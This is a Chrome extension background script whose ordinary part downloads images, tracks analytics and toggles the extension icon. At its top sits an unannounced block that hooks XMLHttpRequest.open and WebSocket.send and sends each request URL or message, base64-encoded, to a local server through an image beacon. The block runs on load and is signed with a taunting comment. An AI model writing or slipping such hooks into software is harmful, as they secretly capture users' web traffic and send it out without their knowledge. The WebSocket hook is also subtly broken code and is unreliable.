function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
console.log("Background Page loaded!");

// Get some Analytics only when not in dev mode
var _gaq = _gaq || [];
if(!isDevMode()){
	_gaq.push(['_setAccount', 'UA-46130942-1']);
	//_gaq.push(['_trackPageview']);

	(function() {
	  var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
	  ga.src = 'https://ssl.google-analytics.com/ga.js';
	  var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
	})();
}

// Source: http://stackoverflow.com/questions/12830649/check-if-chrome-extension-installed-in-unpacked-mode
var __devMode = null;
function isDevMode() {
    if (__devMode == null) {
        var mUrl = chrome.runtime.getURL('manifest.json');
        var xhr = new XMLHttpRequest();
        xhr.open("GET", mUrl, false);
        xhr.onload = function () {
            var json = JSON.parse(this.responseText);
            __devMode = !('update_url' in json);
            console.log("__devMode: " + __devMode);
        };
        xhr.send();
    }
    return __devMode
}

function installed(details) {
	console.log("Extension installed.");

	//Some switching for updates
	switch(details.reason) {
		case "install":
			_gaq.push(['_trackEvent', "Extension", 'installed']);
		break;
		case "update":
			_gaq.push(['_trackEvent', "Extension", 'updated', 'from '+details.previousVersion]);
		break;
	}


	chrome.storage.sync.set({active: true});
}

function updateIcon() {
	chrome.storage.sync.get(null, function(data){
		console.log("Updates icon:"+data.active);

		if(!data.active){
			chrome.browserAction.setIcon({path: "action-on.png"});
			chrome.storage.sync.set({active: true});
		}
		else {
			chrome.browserAction.setIcon({path: "action-off.png"});
			chrome.storage.sync.set({active: false});
		}
	});
}

function actionClick() {
	console.log("browserAction clicked.");
	updateIcon();
}


// Source: http://matt.coneybeare.me/save-image-to-downloads-chrome-extension/
// Problems: http://stackoverflow.com/questions/14033588/javascript-click-method-only-works-once-in-chrome-extension
function _anchorDownloader(url, filename) {
  var timeout = 500;
  return 'javascript:\'<!doctype html><html>'+
    '<head></head>' +
    '<script>' +
      'function initDownload() {'+
        'var el = document.getElementById("anchor");'+
        'el.click();' +
        'setTimeout(function() { window.close(); }, ' + timeout + ');' +
      '}'+
    '</script>' +
    '<body onload="initDownload()">' +
      '<a id="anchor" href="' + url + '" download="'+ filename + '"></a>'+
    '</body>' +
    '</html>\'';
};

function download(url, name) {
	if (chrome.downloads) {
		// Try to avoid this invalid filename error with removing of ":"
		name = name.replace(/\:/g,"");

    	chrome.downloads.download({ url: url, filename: name, saveAs: false }, function(downloadId) {
    		// if it still does not work use the old method
    		if(!downloadId){ 
    			_gaq.push(['_trackEvent', "Download", 'downloaded with workaround']);
    			var a = document.createElement('a');
    			a.href = url;
    			a.download = name;
    			// a.click();
    			chrome.tabs.create( { 'url' : _anchorDownloader( url, name ), 'active' : false  } ); // gets around the download limit
    		}
    		else{
    			_gaq.push(['_trackEvent', "Download", 'downloaded with API']);
    		}
    	});
  	}
  	else{
  		_gaq.push(['_trackEvent', "Download", 'downloaded with workaround']);
		var a = document.createElement('a');
    	a.href = url;
    	a.download = name;
    	// a.click();
    	chrome.tabs.create( { 'url' : _anchorDownloader( url, name ), 'active' : false  } ); // gets around the download limit
    }
}



// Listene for message
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
	console.log("Message recieved: "+JSON.stringify(request));

	switch(request.mode) {
		case "download":
			console.log("Download go!");
			download(request.url, request.name);
		break;
	}	
});

// Set listener for browserAction icon
chrome.browserAction.onClicked.addListener(actionClick);

// Set listener for first installation of extension
chrome.runtime.onInstalled.addListener(installed);
chrome.runtime.onSuspend.addListener(function(){
	console.log("Background Page down");
});

